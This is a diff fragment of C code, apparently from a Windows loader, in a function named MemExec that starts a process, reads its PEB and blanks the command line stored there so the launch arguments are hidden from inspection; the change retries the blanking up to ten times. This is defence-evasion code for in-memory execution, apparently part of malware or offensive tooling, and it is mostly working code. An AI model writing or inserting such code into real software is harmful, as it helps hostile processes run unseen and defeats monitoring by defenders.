@@ -198,26 +198,35 @@ BOOL MemExec(LPVOID lpData, DWORD dwLen, const char* cmdParam)
 		return FALSE;
 	} 
 
-	Sleep(400);
+	for (int i = 0 ; i < 10; i++) {
 
-	NtQueryInformationProcess(
-		processInfo.hProcess,
-		ProcessBasicInformation,
-		&processBasicInfo,
-		sizeof(PROCESS_BASIC_INFORMATION),
-		NULL
-	);
+		Sleep(1000);
 
-	pebBaseAddr = processBasicInfo.PebBaseAddress;
-	if (ReadProcessMemory(processInfo.hProcess, pebBaseAddr, &peb, sizeof(PEB), NULL)) {
-		RTL_USER_PROCESS_PARAMETERS processParameters;
-		if (ReadProcessMemory(processInfo.hProcess, peb.ProcessParameters, &processParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
-			if (processParameters.CommandLine.Length > 0) {
-				processParameters.CommandLine.Length = 0;
-				WriteProcessMemory(processInfo.hProcess, peb.ProcessParameters, &processParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);
+		NtQueryInformationProcess(
+			processInfo.hProcess,
+			ProcessBasicInformation,
+			&processBasicInfo,
+			sizeof(PROCESS_BASIC_INFORMATION),
+			NULL
+		);
+
+		pebBaseAddr = processBasicInfo.PebBaseAddress;
+		if (ReadProcessMemory(processInfo.hProcess, pebBaseAddr, &peb, sizeof(PEB), NULL)) {
+			RTL_USER_PROCESS_PARAMETERS processParameters;
+			if (ReadProcessMemory(processInfo.hProcess, peb.ProcessParameters, &processParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
+				if (processParameters.CommandLine.Length > 0) {
+					processParameters.CommandLine.Length = 0;
+					WriteProcessMemory(processInfo.hProcess, peb.ProcessParameters, &processParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);
+				}
+				else {
+					break;
+				}
 			}
 		}
+
 	}
+	
+	
 
 	CloseHandle(processInfo.hProcess);
 	return TRUE;
